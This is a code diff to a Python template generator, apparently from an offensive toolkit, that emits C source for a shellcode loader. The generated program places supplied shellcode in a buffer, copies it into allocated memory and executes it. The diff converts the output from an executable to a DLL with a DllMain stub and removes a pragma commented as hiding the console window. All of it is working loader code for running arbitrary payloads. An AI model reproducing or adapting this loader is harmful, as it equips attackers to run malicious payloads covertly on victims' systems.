@@ -1,7 +1,7 @@
 from ClassCongregation import BinaryDataTypeConversion
 import random
 __language__=".c"
-__process__=".exe"
+__process__=".dll"
 
 def main(Shellcode):
     Code = """
@@ -9,10 +9,9 @@ def main(Shellcode):
 #include <stdio.h>
 #include <string.h>
 
-#pragma comment(linker,"/subsystem:\"Windows\" /entry:\"mainCRTStartup\"") //windows控制台程序不出黑窗口
-
 unsigned char buf[] = \""""+Shellcode+"""\";
-int main()
+
+int add()
 
 {
     LPVOID Memory;
@@ -24,6 +23,22 @@ int main()
     ((void(*)())Memory)();
     return 0;
 
-}"""
+}
+BOOL APIENTRY DllMain( HMODULE hModule,
+                       DWORD  ul_reason_for_call,
+                       LPVOID lpReserved
+                     )
+{
+    switch (ul_reason_for_call)
+    {
+    case DLL_PROCESS_ATTACH:
+    case DLL_THREAD_ATTACH:
+    case DLL_THREAD_DETACH:
+    case DLL_PROCESS_DETACH:
+        break;
+    }
+    return TRUE;
+}
+"""
     return Code
 
